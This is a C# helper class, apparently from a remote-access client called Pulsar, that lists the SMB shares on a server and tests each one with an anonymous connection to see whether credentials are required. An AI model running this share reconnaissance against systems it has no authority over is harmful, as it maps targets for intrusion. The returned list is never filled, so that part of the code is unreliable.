using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.Network
{
    public static class SMBHelper
    {
        private const int MAX_PREFERRED_LENGTH = -1;
        private const int NERR_SUCCESS = 0;

        [StructLayout(LayoutKind.Sequential)]
        public struct SHARE_INFO_1
        {
            public string shi1_netname;
            public uint shi1_type;
            public string shi1_remark;
        }

        public class ShareInfo
        {
            public string ShareName { get; set; }
            public uint ShareType { get; set; }
            public string Remark { get; set; }
            public bool RequiresCredentials { get; set; }
        }

        [DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
        public static extern int NetShareEnum(
            string serverName,
            int level,
            out IntPtr bufPtr,
            int prefmaxlen,
            out int entriesRead,
            out int totalEntries,
            ref int resumeHandle);

        [DllImport("Netapi32.dll")]
        public static extern int NetApiBufferFree(IntPtr Buffer);

        [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
        public static extern int WNetAddConnection2(ref NETRESOURCE lpNetResourse, string lpPassword, string lpUserName, int dwFlags);

        [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
        public static extern int WNetCancelConnection2(string lpName, int dwFlags, bool fForce);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct NETRESOURCE
        {
            public uint dwScope;
            public uint dwType;
            public uint dwDisplayType;
            public uint dwUsage;
            public string lpLocalName;
            public string lpRemoteName;
            public string lpComment;
            public string lpProvider;
        }

        private const int ERROR_ACCESS_DENIED = 5;
        private const int ERROR_ALREADY_ASSIGNED = 85;
        private const int ERROR_SESSION_CREDENTIAL_CONFLICT = 1219;

        public static bool ShareRequiresCredentials(string server, string shareName)
        {
            string uncPath = server.TrimEnd('\\') + "\\" + shareName;
            NETRESOURCE nr = new NETRESOURCE
            {
                dwType = 1,
                lpRemoteName = uncPath
            };
            int result = WNetAddConnection2(ref nr, null, null, 0);
            if (result == 0)
            {
                WNetCancelConnection2(uncPath, 0, true);
                return false;
            }
            else
            {
                return true;
            }
        }

        public static List<ShareInfo> GetSMBSharesWithCredentialInfo(string server, Action<ShareInfo> action)
        {
            List<ShareInfo> shareList = new List<ShareInfo>();
            IntPtr buffer = IntPtr.Zero;
            int entriesRead = 0;
            int totalEntries = 0;
            int resumeHandle = 0;
            int ret = NetShareEnum(server, 1, out buffer, MAX_PREFERRED_LENGTH, out entriesRead, out totalEntries, ref resumeHandle);
            if (ret == NERR_SUCCESS && entriesRead > 0)
            {
                int structSize = Marshal.SizeOf(typeof(SHARE_INFO_1));
                for (int i = 0; i < entriesRead; i++)
                {
                    IntPtr currentPtr = new IntPtr(buffer.ToInt64() + i * structSize);
                    SHARE_INFO_1 shareInfo = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));
                    bool requiresCreds = ShareRequiresCredentials(server, shareInfo.shi1_netname);
                    action(new ShareInfo
                    {
                        ShareName = shareInfo.shi1_netname,
                        ShareType = shareInfo.shi1_type,
                        Remark = shareInfo.shi1_remark,
                        RequiresCredentials = requiresCreds
                    });
                }
            }
            else
            {
                //MessageBox.Show("Failed to enumerate shares. Return code: " + ret);
            }
            if (buffer != IntPtr.Zero)
            {
                NetApiBufferFree(buffer);
            }
            return shareList;
        }
    }
}
